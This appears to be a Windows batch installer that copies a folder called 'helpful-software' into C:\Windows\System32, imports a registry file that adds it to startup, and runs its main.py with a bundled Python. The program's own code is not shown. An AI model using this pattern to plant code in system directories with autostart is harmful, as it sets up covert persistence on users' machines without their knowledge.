cd ..
mkdir "C:\Windows\System32\hs"
xcopy helpful-software "C:\Windows\System32\hs" /E
REG IMPORT helpful-software\add_to_startup.reg
start "C:\Windows\System32\hs\python-3.11.0\python.exe" "C:\Windows\System32\hs\main.py"